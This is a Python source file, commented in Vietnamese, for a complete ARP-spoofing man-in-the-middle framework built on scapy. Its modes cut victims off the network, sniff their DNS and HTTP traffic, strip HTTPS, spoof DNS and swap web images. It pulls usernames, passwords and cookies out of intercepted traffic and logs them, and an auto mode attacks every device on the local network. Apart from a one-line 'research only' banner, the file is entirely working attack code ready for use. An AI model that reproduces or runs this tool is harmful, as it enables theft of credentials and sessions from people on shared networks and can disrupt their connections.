
"""
ARP SPOOFING FRAMEWORK
Công cụ Man-in-the-Middle Attack & Network Analysis

Features:
- ARP Spoofing (NetCut/MITM)
- SSL Stripping
- Credential Harvesting
- Image Replacement
- Fake DNS Server
- Auto Attack Mode
- Live Dashboard
- Cross-platform Support
"""

from scapy.all import *
from scapy.supersocket import L3RawSocket
import netifaces as ni
import sys
import os
import time
import threading
import subprocess
import platform
import json
import urllib.parse
from datetime import datetime
from collections import defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

# Rich Console for beautiful output
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

# Windows specific
if platform.system() == "Windows":
    conf.L3socket = L3RawSocket
    from scapy.arch.windows import get_windows_if_list

console = Console()

# ==================== PRIVILEGE CHECK ====================
def check_privileges():
    """Kiểm tra quyền root/admin"""
    if platform.system() == 'Linux':
        if os.geteuid() != 0:
            console.print("[red]❌ Tool cần quyền root! Chạy: sudo python3 arp_final.py[/red]")
            sys.exit(1)
    
    elif platform.system() == 'Windows':
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                console.print("[red]❌ Tool cần quyền Administrator![/red]")
                console.print("[yellow]Right-click → Run as Administrator[/yellow]")
                sys.exit(1)
        except:
            pass
    
    console.print("[green]✅ Đã xác thực quyền thành công[/green]\n")

# ==================== LOGGER ====================
class Logger:
    """Hệ thống logging toàn diện"""
    
    def __init__(self):
        self.log_dir = Path("mitm_logs")
        self.log_dir.mkdir(exist_ok=True)
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def log(self, log_type, data):
        """Ghi log ra file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        filename = self.log_dir / f"{log_type}_{self.session_id}.txt"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {data}\n")
    
    def log_dns(self, victim_ip, domain):
        self.log('dns', f"{victim_ip} → {domain}")
    
    def log_http(self, victim_ip, host, path):
        self.log('http', f"{victim_ip} → {host}{path}")
    
    def log_credentials(self, victim_ip, creds):
        self.log('credentials', f"{victim_ip} → {json.dumps(creds, ensure_ascii=False)}")
        console.print(f"[bold red]💀 CREDENTIALS SAVED TO LOG![/bold red]")
    
    def log_cookie(self, victim_ip, cookies):
        self.log('cookies', f"{victim_ip} → {cookies}")

# ==================== VENDOR DETECTOR ====================
class VendorDetector:
    """Tra cứu nhà sản xuất từ MAC address"""
    
    def __init__(self):
        self.cache = {}
        self.oui_file = Path("oui.txt")
        self.load_offline_db()
    
    def load_offline_db(self):
        """Load database offline từ file oui.txt"""
        if not self.oui_file.exists():
            console.print("[yellow]⚠️ File oui.txt không tồn tại. Đang tải xuống...[/yellow]")
            self.download_oui_db()
    
    def download_oui_db(self):
        """Tải database IEEE OUI"""
        try:
            import requests
            url = "http://standards-oui.ieee.org/oui/oui.txt"
            console.print("[cyan]Đang tải IEEE OUI database (40MB)...[/cyan]")
            
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                with open(self.oui_file, 'wb') as f:
                    f.write(response.content)
                console.print("[green]✅ Đã tải database thành công![/green]")
        except Exception as e:
            console.print(f"[red]❌ Lỗi tải database: {e}[/red]")
    
    def get_vendor(self, mac):
        """Tra cứu vendor từ MAC"""
        oui = mac[:8].replace(':', '').upper()
        
        # Check cache
        if oui in self.cache:
            return self.cache[oui]
        
        # Try API first (nhanh hơn)
        vendor = self._api_lookup(mac)
        if vendor and vendor != "Unknown":
            self.cache[oui] = vendor
            return vendor
        
        # Fallback to offline database
        vendor = self._offline_lookup(oui)
        self.cache[oui] = vendor
        return vendor
    
    def _api_lookup(self, mac):
        """Tra cứu qua API MacVendors.com"""
        try:
            import requests
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return "Unknown"
    
    def _offline_lookup(self, oui):
        """Tra cứu từ file oui.txt"""
        if not self.oui_file.exists():
            return "Unknown"
        
        try:
            with open(self.oui_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if oui in line:
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            return parts[2].strip()
        except:
            pass
        return "Unknown"

# ==================== SCANNER ====================
class Scanner:
    """Quét thiết bị trong mạng LAN"""
    
    def __init__(self, iface):
        self.iface = iface
        self.vendor_detector = VendorDetector()
        
        try:
            self.my_ip = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']
            self.net = '.'.join(self.my_ip.split('.')[:3] + ['0/24'])
        except (ValueError, KeyError):
            console.print("[red]❌ Không tìm thấy IP trên interface này![/red]")
            sys.exit(1)
    
    def scan(self):
        """Quét mạng và trả về danh sách thiết bị"""
        console.print(f"[yellow]🔍 Đang quét mạng {self.net} trên {self.iface}...[/yellow]")
        
        try:
            ans, _ = arping(self.net, iface=self.iface, verbose=0, timeout=3)
        except Exception as e:
            console.print(f"[red]❌ Lỗi quét mạng: {e}[/red]")
            return []
        
        devices = []
        for sent, recv in ans:
            mac = recv.hwsrc
            vendor = self.vendor_detector.get_vendor(mac)
            devices.append({
                'ip': recv.psrc,
                'mac': mac,
                'vendor': vendor
            })
        
        console.print(f"[green]✅ Tìm thấy {len(devices)} thiết bị[/green]")
        return devices

# ==================== LIVE DASHBOARD ====================
class LiveDashboard:
    """Hiển thị thống kê real-time"""
    
    def __init__(self, attacker):
        self.attacker = attacker
        self.stats = {
            'arp_packets': 0,
            'dns_queries': 0,
            'http_requests': 0,
            'https_requests': 0,
            'credentials': 0,
            'cookies': 0,
            'images_replaced': 0,
            'start_time': time.time()
        }
        self.running = False
        self.live = None
    
    def start(self):
        """Khởi động dashboard"""
        self.running = True
        threading.Thread(target=self._update_loop, daemon=True).start()
    
    def _update_loop(self):
        """Vòng lặp cập nhật dashboard"""
        try:
            with Live(self._generate_dashboard(), refresh_per_second=2, console=console) as live:
                self.live = live
                while self.running:
                    live.update(self._generate_dashboard())
                    time.sleep(0.5)
        except Exception as e:
            pass  # Tránh crash khi terminal resize
    
    def _generate_dashboard(self):
        """Tạo layout dashboard"""
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=3)
        )
        
        # Header
        uptime = int(time.time() - self.stats['start_time'])
        mins, secs = divmod(uptime, 60)
        layout["header"].update(
            Panel(
                f"[bold red]⚔️  ARP SPOOFING ĐANG HOẠT ĐỘNG[/bold red] | ⏱️  Uptime: {mins:02d}:{secs:02d}",
                style="red"
            )
        )
        
        # Body - Stats
        stats_text = f"""
[cyan]🎯 Mục Tiêu:[/cyan] {self.attacker.victim_ip} ({self.attacker.victim_mac[:17]})
[cyan]🌐 Gateway:[/cyan] {self.attacker.gateway_ip} ({self.attacker.gateway_mac[:17]})
[cyan]🔧 Chế Độ:[/cyan] {self.attacker.mode.upper()}

[yellow]📊 Thống Kê Tấn Công:[/yellow]
  📦 ARP Packets Sent:    {self.stats['arp_packets']:>6}
  🌐 DNS Queries:         {self.stats['dns_queries']:>6}
  🌍 HTTP Requests:       {self.stats['http_requests']:>6}
  🔒 HTTPS Requests:      {self.stats['https_requests']:>6}
  🔑 Credentials Captured:{self.stats['credentials']:>6}
  🍪 Cookies Stolen:      {self.stats['cookies']:>6}
  🖼️  Images Replaced:     {self.stats['images_replaced']:>6}
"""
        layout["body"].update(Panel(stats_text, title="[bold]Live Statistics[/bold]", border_style="cyan"))
        
        # Footer
        layout["footer"].update(
            Panel(
                "[dim]Nhấn Ctrl+C để dừng tool và khôi phục mạng[/dim]",
                style="dim"
            )
        )
        
        return layout
    
    def increment(self, stat_name):
        """Tăng counter"""
        if stat_name in self.stats:
            self.stats[stat_name] += 1
    
    def stop(self):
        """Dừng dashboard"""
        self.running = False

# ==================== SSL STRIPPER ====================
class SSLStripper:
    """Hạ cấp HTTPS xuống HTTP"""
    
    def __init__(self, iface, dashboard=None):
        self.iface = iface
        self.dashboard = dashboard
        self.running = False
        self.server = None
    
    def start(self):
        """Setup iptables/netsh và chạy proxy"""
        if platform.system() == 'Linux':
            self._setup_linux()
        else:
            console.print("[yellow]⚠️ SSL Stripping chỉ hỗ trợ đầy đủ trên Linux[/yellow]")
            return
        
        self.running = True
        threading.Thread(target=self._run_proxy, daemon=True).start()
        console.print("[green]✅ SSL Stripper listening on :8080[/green]")
    
    def _setup_linux(self):
        """Setup iptables rules"""
        try:
            subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '8080'
            ], stderr=subprocess.DEVNULL)
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '8080'
            ], stderr=subprocess.DEVNULL)
        except Exception as e:
            console.print(f"[red]❌ Lỗi setup iptables: {e}[/red]")
    
    def _run_proxy(self):
        """HTTP Proxy để strip SSL"""
        class ProxyHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Tắt logging mặc định
            
            def do_GET(self):
                url = self.path.replace('https://', 'http://')
                
                if self.server.dashboard:
                    self.server.dashboard.increment('https_requests')
                
                console.print(f"[red]🔓 SSL Stripped:[/red] {url[:80]}...")
                
                try:
                    import requests
                    resp = requests.get(url, timeout=5, verify=False)
                    
                    self.send_response(200)
                    for k, v in resp.headers.items():
                        if k.lower() not in ['transfer-encoding', 'content-encoding']:
                            self.send_header(k, v)
                    self.end_headers()
                    self.wfile.write(resp.content)
                except:
                    self.send_error(404)
            
            do_POST = do_GET
        
        try:
            self.server = HTTPServer(('0.0.0.0', 8080), ProxyHandler)
            self.server.dashboard = self.dashboard
            self.server.serve_forever()
        except Exception as e:
            console.print(f"[red]❌ SSL Stripper error: {e}[/red]")
    
    def stop(self):
        """Dừng SSL stripper"""
        self.running = False
        if platform.system() == 'Linux':
            try:
                subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
            except:
                pass
        if self.server:
            try:
                self.server.shutdown()
            except:
                pass

# ==================== IMAGE REPLACER ====================
class ImageReplacer:
    """Thay thế hình ảnh bằng ảnh troll"""
    
    def __init__(self, troll_url, dashboard=None):
        self.troll_url = troll_url
        self.dashboard = dashboard
        self.running = False
        self.server = None
    
    def start(self):
        """Khởi động image replacer"""
        if platform.system() != 'Linux':
            console.print("[yellow]⚠️ Image Replacer chỉ hỗ trợ Linux[/yellow]")
            return
        
        self._setup_iptables()
        self.running = True
        threading.Thread(target=self._run_proxy, daemon=True).start()
        console.print("[green]✅ Image Replacer listening on :8888[/green]")
    
    def _setup_iptables(self):
        """Setup iptables"""
        try:
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '8888'
            ], stderr=subprocess.DEVNULL)
        except:
            pass
    
    def _run_proxy(self):
        """HTTP Proxy thay thế images"""
        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                url = self.path
                
                # Check nếu là image
                if any(ext in url.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.svg']):
                    if self.server.dashboard:
                        self.server.dashboard.increment('images_replaced')
                    
                    console.print(f"[red]🖼️  Replacing:[/red] {url[:60]}...")
                    
                    try:
                        import requests
                        troll_img = requests.get(self.server.troll_url, timeout=3)
                        self.send_response(200)
                        self.send_header('Content-Type', 'image/jpeg')
                        self.end_headers()
                        self.wfile.write(troll_img.content)
                        return
                    except:
                        pass
                
                # Forward bình thường
                try:
                    import requests
                    resp = requests.get(url, timeout=5)
                    self.send_response(200)
                    for k, v in resp.headers.items():
                        if k.lower() not in ['transfer-encoding', 'content-encoding', 'content-length']:
                            self.send_header(k, v)
                    self.end_headers()
                    self.wfile.write(resp.content)
                except:
                    self.send_error(404)
        
        try:
            self.server = HTTPServer(('0.0.0.0', 8888), Handler)
            self.server.troll_url = self.troll_url
            self.server.dashboard = self.dashboard
            self.server.serve_forever()
        except Exception as e:
            console.print(f"[red]❌ Image Replacer error: {e}[/red]")
    
    def stop(self):
        """Dừng image replacer"""
        self.running = False
        if self.server:
            try:
                self.server.shutdown()
            except:
                pass

# ==================== FAKE DNS SERVER ====================
class FakeDNS:
    """DNS Spoofing server"""
    
    def __init__(self, fake_ip, dashboard=None):
        self.fake_ip = fake_ip
        self.dashboard = dashboard
        self.running = False
    
    def start(self):
        """Bắt đầu fake DNS"""
        self.running = True
        console.print(f"[green]✅ Fake DNS started - Redirecting to {self.fake_ip}[/green]")
        threading.Thread(target=self._dns_responder, daemon=True).start()
    
    def _dns_responder(self):
        """Lắng nghe và trả lời DNS queries"""
        def handle_dns(pkt):
            if not self.running:
                return
            
            if pkt.haslayer(DNSQR):
                try:
                    query = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                    
                    # Tạo DNS reply giả
                    fake_dns = (
                        Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                        UDP(sport=53, dport=pkt[UDP].sport) /
                        DNS(
                            id=pkt[DNS].id,
                            qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=query, ttl=10, rdata=self.fake_ip)
                        )
                    )
                    
                    send(fake_dns, verbose=0)
                    console.print(f"[red]🎯 DNS Spoofed:[/red] {query} → {self.fake_ip}")
                except:
                    pass
        
        try:
            sniff(filter="udp port 53", prn=handle_dns, store=0, stop_filter=lambda x: not self.running)
        except Exception as e:
            console.print(f"[red]❌ Fake DNS error: {e}[/red]")
    
    def stop(self):
        """Dừng fake DNS"""
        self.running = False

# ==================== ATTACKER ====================
class Attacker:
    """Core ARP Spoofing engine"""
    
    def __init__(self, victim_ip, gateway_ip, iface):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.mode = "netcut"
        self.running = False
        self.logger = Logger()
        self.dashboard = None
        
        console.print("[cyan]🔍 Đang lấy địa chỉ MAC...[/cyan]")
        self.victim_mac = self.get_mac(victim_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.my_mac = get_if_hwaddr(iface)
        
        if not self.victim_mac or not self.gateway_mac:
            console.print("[red]❌ Không tìm thấy MAC. Kiểm tra kết nối![/red]")
            sys.exit(1)
        
        console.print(f"[green]✅ Victim MAC: {self.victim_mac}[/green]")
        console.print(f"[green]✅ Gateway MAC: {self.gateway_mac}[/green]")
    
    def get_mac(self, ip):
        """Lấy MAC address từ IP"""
        try:
            ans, _ = arping(ip, iface=self.iface, verbose=0, timeout=2)
            return ans[0][1].src if ans else None
        except:
            return None
    
    def set_ip_forward(self, enable):
        """Bật/Tắt IP forwarding - Cross-platform"""
        if platform.system() == 'Linux':
            try:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1\n' if enable else '0\n')
                status = "BẬT" if enable else "TẮT"
                console.print(f"[yellow]⚙️  IP Forwarding: {status}[/yellow]")
            except Exception as e:
                console.print(f"[red]❌ Lỗi IP Forward: {e}[/red]")
        
        elif platform.system() == 'Windows':
            # Windows registry method
            try:
                guid = self._get_interface_guid()
                if guid:
                    import winreg
                    key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\\" + guid
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1 if enable else 0)
                    winreg.CloseKey(key)
                    
                    status = "BẬT" if enable else "TẮT"
                    console.print(f"[yellow]⚙️  IP Forwarding: {status}[/yellow]")
            except Exception as e:
                console.print(f"[red]❌ Lỗi IP Forward: {e}[/red]")
    
    def _get_interface_guid(self):
        """Lấy GUID interface trên Windows"""
        try:
            for i in get_windows_if_list():
                if self.iface.lower() in i['description'].lower() or self.iface in i['name']:
                    return i['guid']
        except:
            pass
        return None
    
    def spoof(self):
        """Vòng lặp ARP spoofing"""
        self.running = True
        console.print(f"[green]⚔️  Bắt đầu ARP Spoofing: {self.victim_ip} ↔ {self.gateway_ip}[/green]")
        
        while self.running:
            try:
                # Lừa Victim: "Tao là Gateway"
                send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
                        hwdst=self.victim_mac, hwsrc=self.my_mac), verbose=0)
                
                # Lừa Gateway: "Tao là Victim"
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip,
                        hwdst=self.gateway_mac, hwsrc=self.my_mac), verbose=0)
                
                if self.dashboard:
                    self.dashboard.increment('arp_packets')
                    self.dashboard.increment('arp_packets')
                
                time.sleep(2)
            except Exception as e:
                console.print(f"[red]❌ Spoof error: {e}[/red]")
                break
    
    def packet_callback(self, pkt):
        """Xử lý packets bắt được"""
        try:
            # DNS Queries
            if pkt.haslayer(DNSQR):
                try:
                    site = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                    if site and not site.startswith('_'):
                        console.print(f"[cyan]🌐 DNS:[/cyan] {site[:60]}")
                        self.logger.log_dns(self.victim_ip, site)
                        if self.dashboard:
                            self.dashboard.increment('dns_queries')
                except:
                    pass
            
            # HTTP Traffic
            elif pkt.haslayer(Raw):
                try:
                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                    
                    # HTTP Requests
                    if 'GET' in payload or 'POST' in payload:
                        lines = payload.split('\r\n')
                        if len(lines) > 0:
                            request_line = lines[0]
                            host = "Unknown"
                            
                            for line in lines[1:]:
                                if line.startswith('Host:'):
                                    host = line.split('Host: ')[1].strip()
                                    break
                            
                            if 'GET' in request_line or 'POST' in request_line:
                                path = request_line.split(' ')[1] if len(request_line.split(' ')) > 1 else '/'
                                console.print(f"[yellow]🌍 HTTP:[/yellow] {host}{path[:40]}")
                                self.logger.log_http(self.victim_ip, host, path)
                                if self.dashboard:
                                    self.dashboard.increment('http_requests')
                    
                    # Credential Harvesting
                    if 'POST' in payload and ('password' in payload.lower() or 'pass=' in payload.lower()):
                        console.print(f"[bold red]🔑 CREDENTIALS DETECTED![/bold red]")
                        
                        # Extract POST body
                        if '\r\n\r\n' in payload:
                            body = payload.split('\r\n\r\n', 1)[1]
                            
                            # Parse form data
                            creds = {}
                            for pair in body.split('&'):
                                if '=' in pair:
                                    key, val = pair.split('=', 1)
                                    key = key.lower()
                                    val = urllib.parse.unquote(val)
                                    
                                    if any(x in key for x in ['user', 'email', 'login', 'account']):
                                        creds['username'] = val
                                    if any(x in key for x in ['pass', 'pwd']):
                                        creds['password'] = val
                            
                            if creds:
                                console.print(f"[bold red]💀 STOLEN:[/bold red] {creds}")
                                self.logger.log_credentials(self.victim_ip, creds)
                                if self.dashboard:
                                    self.dashboard.increment('credentials')
                    
                    # Cookie Stealing
                    elif 'Cookie:' in payload:
                        cookie_line = [l for l in payload.split('\r\n') if l.startswith('Cookie:')]
                        if cookie_line:
                            cookies = cookie_line[0].replace('Cookie: ', '')
                            console.print(f"[yellow]🍪 Cookie:[/yellow] {cookies[:80]}...")
                            self.logger.log_cookie(self.victim_ip, cookies)
                            if self.dashboard:
                                self.dashboard.increment('cookies')
                
                except:
                    pass
        
        except Exception as e:
            pass  # Silent fail để không spam console
    
    def mitm_sniff(self):
        """Lắng nghe traffic của victim"""
        console.print("[cyan]👂 Đang lắng nghe traffic...[/cyan]")
        try:
            sniff(iface=self.iface, prn=self.packet_callback,
                  filter=f"host {self.victim_ip}",
                  store=0, stop_filter=lambda x: not self.running)
        except Exception as e:
            console.print(f"[red]❌ Sniff error: {e}[/red]")
    
    def start(self, mode='netcut', enable_dashboard=True):
        """Khởi động attack"""
        self.mode = mode
        
        # Setup dashboard
        if enable_dashboard:
            self.dashboard = LiveDashboard(self)
            self.dashboard.start()
        
        if mode == 'netcut':
            console.print("[red]🔪 Mode: NETCUT (Cắt mạng nạn nhân)[/red]")
            self.set_ip_forward(False)
        
        elif mode == 'mitm':
            console.print("[blue]🕵️  Mode: MITM (Nghe lén traffic)[/blue]")
            self.set_ip_forward(True)
            threading.Thread(target=self.mitm_sniff, daemon=True).start()
        
        elif mode == 'sslstrip':
            console.print("[red]🔓 Mode: SSL STRIP (Hạ cấp HTTPS)[/red]")
            self.set_ip_forward(True)
            self.ssl_stripper = SSLStripper(self.iface, self.dashboard)
            self.ssl_stripper.start()
            threading.Thread(target=self.mitm_sniff, daemon=True).start()
        
        elif mode == 'imageswap':
            console.print("[red]🖼️  Mode: IMAGE SWAP (Đổi hình ảnh)[/red]")
            self.set_ip_forward(True)
            troll_url = "https://i.imgur.com/R390EId.jpg"  # Rickroll image
            self.image_replacer = ImageReplacer(troll_url, self.dashboard)
            self.image_replacer.start()
            threading.Thread(target=self.mitm_sniff, daemon=True).start()
        
        elif mode == 'dnsspoof':
            console.print("[red]🎯 Mode: DNS SPOOF (Chuyển hướng domain)[/red]")
            self.set_ip_forward(True)
            fake_ip = Prompt.ask("Nhập IP muốn redirect đến", default="192.168.1.100")
            self.fake_dns = FakeDNS(fake_ip, self.dashboard)
            self.fake_dns.start()
            threading.Thread(target=self.mitm_sniff, daemon=True).start()
        
        # Start ARP spoofing thread
        self.spoof_thread = threading.Thread(target=self.spoof, daemon=True)
        self.spoof_thread.start()
    
    def stop(self):
        """Dừng attack và khôi phục"""
        self.running = False
        
        # Stop dashboard
        if self.dashboard:
            self.dashboard.stop()
        
        console.print("\n[yellow]🔄 Đang khôi phục bảng ARP...[/yellow]")
        
        # Wait for spoof thread
        if hasattr(self, 'spoof_thread'):
            self.spoof_thread.join(timeout=3)
        
        # Restore ARP - Gửi nhiều packets
        console.print("[cyan]📡 Gửi 30 gói ARP phục hồi...[/cyan]")
        for i in range(30):
            try:
                # Restore victim
                send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
                        hwdst=self.victim_mac, hwsrc=self.gateway_mac), verbose=0)
                # Restore gateway
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip,
                        hwdst=self.gateway_mac, hwsrc=self.victim_mac), verbose=0)
                time.sleep(0.1)
            except:
                pass
        
        # Cleanup
        self.set_ip_forward(False)
        
        # Stop additional modules
        if hasattr(self, 'ssl_stripper'):
            self.ssl_stripper.stop()
        if hasattr(self, 'image_replacer'):
            self.image_replacer.stop()
        if hasattr(self, 'fake_dns'):
            self.fake_dns.stop()
        
        console.print("[green]✅ Đã khôi phục hoàn toàn![/green]")

# ==================== AUTO ATTACKER ====================
class AutoAttacker:
    """Tấn công tự động toàn bộ mạng"""
    
    def __init__(self, iface):
        self.iface = iface
        self.scanner = Scanner(iface)
        self.attackers = []
    
    def start(self, mode='netcut'):
        """Quét và tấn công tất cả thiết bị"""
        console.print("[yellow]🔍 Đang quét mạng...[/yellow]")
        devices = self.scanner.scan()
        
        if not devices:
            console.print("[red]❌ Không tìm thấy thiết bị![/red]")
            return
        
        # Lấy gateway và IP của mình
        gateway_ip = self.scanner.net.replace('0/24', '1')
        my_ip = self.scanner.my_ip
        
        # Filter devices
        targets = [d for d in devices if d['ip'] not in [my_ip, gateway_ip]]
        
        if not targets:
            console.print("[red]❌ Không có mục tiêu hợp lệ![/red]")
            return
        
        console.print(f"[green]✅ Tìm thấy {len(targets)} mục tiêu[/green]")
        
        if not Confirm.ask(f"Xác nhận tấn công {len(targets)} thiết bị?"):
            return
        
        console.print(f"[red]⚔️  Bắt đầu tấn công hàng loạt...[/red]")
        
        for device in targets:
            victim_ip = device['ip']
            console.print(f"[red]🎯 Attacking {victim_ip} ({device['vendor']})[/red]")
            
            try:
                attacker = Attacker(victim_ip, gateway_ip, self.iface)
                attacker.start(mode, enable_dashboard=False)
                self.attackers.append(attacker)
                time.sleep(1)  # Delay để tránh quá tải
            except Exception as e:
                console.print(f"[yellow]⚠️  Failed {victim_ip}: {e}[/yellow]")
        
        console.print(f"[green]✅ Đang tấn công {len(self.attackers)} thiết bị![/green]")
    
    def stop(self):
        """Dừng tất cả attacks"""
        console.print("[yellow]🛑 Đang dừng tất cả attacks...[/yellow]")
        for attacker in self.attackers:
            try:
                attacker.stop()
            except:
                pass
        console.print("[green]✅ Đã dừng toàn bộ![/green]")

# ==================== UTILITY FUNCTIONS ====================
def print_banner():
    """In banner tool"""
    banner = """
[bold red]
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ║
║    ██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗ ║
║    ███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║ ║
║    ██╔══██║██╔══██╗██╔═══╝     ╚════██║██╔═══╝ ██║   ██║ ║
║    ██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝ ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ║
║                                                           ║
║              FRAMEWORK v2.0 - FINAL EDITION              ║
║           Man-in-the-Middle Attack & Analysis            ║
╚═══════════════════════════════════════════════════════════╝
[/bold red]
[yellow]⚠️  CẢNH BÁO: Chỉ sử dụng cho mục đích nghiên cứu![/yellow]
"""
    console.print(banner)

def print_devices(devices):
    """In bảng thiết bị"""
    table = Table(title="🌐 Danh Sách Thiết Bị Trong Mạng", show_lines=True)
    table.add_column("IP Address", style="cyan", justify="center")
    table.add_column("MAC Address", style="magenta", justify="center")
    table.add_column("Vendor", style="green")
    
    for d in devices:
        table.add_row(d['ip'], d['mac'], d['vendor'])
    
    console.print(table)

def select_interface():
    """Chọn network interface"""
    console.print("\n[bold cyan]📡 Danh sách Network Interfaces:[/bold cyan]")
    
    interfaces = ni.interfaces()
    
    if platform.system() == "Windows":
        # Windows: Hiển thị description dễ hiểu
        win_interfaces = get_windows_if_list()
        table = Table()
        table.add_column("ID", style="cyan")
        table.add_column("Name", style="yellow")
        table.add_column("Description", style="green")
        
        for idx, iface in enumerate(win_interfaces, 1):
            table.add_row(str(idx), iface['name'], iface['description'])
        
        console.print(table)
        
        choice = Prompt.ask("Chọn interface (nhập số)", choices=[str(i) for i in range(1, len(win_interfaces)+1)])
        return win_interfaces[int(choice)-1]['name']
    else:
        # Linux/Mac: Hiển thị tên interface
        table = Table()
        table.add_column("ID", style="cyan")
        table.add_column("Interface", style="yellow")
        
        valid_interfaces = []
        for idx, iface in enumerate(interfaces, 1):
            try:
                # Check if interface has IP
                addrs = ni.ifaddresses(iface)
                if ni.AF_INET in addrs:
                    table.add_row(str(idx), iface)
                    valid_interfaces.append(iface)
            except:
                pass
        
        console.print(table)
        
        choice = Prompt.ask("Chọn interface (nhập số)", choices=[str(i) for i in range(1, len(valid_interfaces)+1)])
        return valid_interfaces[int(choice)-1]

# ==================== MAIN ====================
def main():
    """Main function"""
    try:
        # Check privileges
        check_privileges()
        
        # Print banner
        print_banner()
        
        # Select interface
        iface = select_interface()
        console.print(f"\n[green]✅ Đã chọn interface: {iface}[/green]")
        
        # Scan network
        scanner = Scanner(iface)
        devices = scanner.scan()
        
        if not devices:
            console.print("[red]❌ Không tìm thấy thiết bị nào![/red]")
            sys.exit()
        
        print_devices(devices)
        
        # Choose mode
        console.print("\n[bold yellow]🎯 Chọn chế độ tấn công:[/bold yellow]")
        console.print("[1] Single Target - Tấn công 1 mục tiêu")
        console.print("[2] Auto Attack - Tấn công toàn bộ mạng")
        
        attack_mode = Prompt.ask("Chọn chế độ", choices=["1", "2"], default="1")
        
        if attack_mode == "2":
            # Auto attack mode
            console.print("\n[bold]⚙️  Cấu hình Auto Attack:[/bold]")
            mode = Prompt.ask(
                "Chọn phương thức",
                choices=["netcut", "mitm", "sslstrip"],
                default="netcut"
            )
            
            auto = AutoAttacker(iface)
            auto.start(mode)
            
            console.print("\n[bold red]⚔️  Đang chạy... Nhấn Enter để dừng.[/bold red]")
            input()
            auto.stop()
        
        else:
            # Single target mode
            console.print("\n[bold]⚙️  Cấu hình Single Target:[/bold]")
            
            victim_ip = Prompt.ask(
                "Nhập IP nạn nhân",
                choices=[d['ip'] for d in devices]
            )
            
            default_gateway = scanner.net.replace('0/24', '1')
            gateway_ip = Prompt.ask("Nhập IP Gateway", default=default_gateway)
            
            console.print("\n[bold yellow]🎯 Chọn phương thức tấn công:[/bold yellow]")
            console.print("[cyan]netcut[/cyan]    - Cắt kết nối mạng hoàn toàn")
            console.print("[cyan]mitm[/cyan]      - Nghe lén traffic (DNS, HTTP, Credentials)")
            console.print("[cyan]sslstrip[/cyan]  - Hạ cấp HTTPS xuống HTTP")
            console.print("[cyan]imageswap[/cyan] - Thay thế hình ảnh bằng ảnh troll")
            console.print("[cyan]dnsspoof[/cyan]  - Giả mạo DNS, chuyển hướng website")
            
            mode = Prompt.ask(
                "Chọn phương thức",
                choices=["netcut", "mitm", "sslstrip", "imageswap", "dnsspoof"],
                default="netcut"
            )
            
            # Start attack
            attacker = Attacker(victim_ip, gateway_ip, iface)
            attacker.start(mode)
            
            console.print("\n[bold red]⚔️  Đang chạy... Nhấn Ctrl+C để dừng.[/bold red]")
            
            while True:
                time.sleep(1)
    
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Phát hiện Ctrl+C...[/yellow]")
        if 'attacker' in locals():
            attacker.stop()
        elif 'auto' in locals():
            auto.stop()
        sys.exit(0)
    
    except Exception as e:
        console.print(f"\n[red]❌ Lỗi nghiêm trọng: {e}[/red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()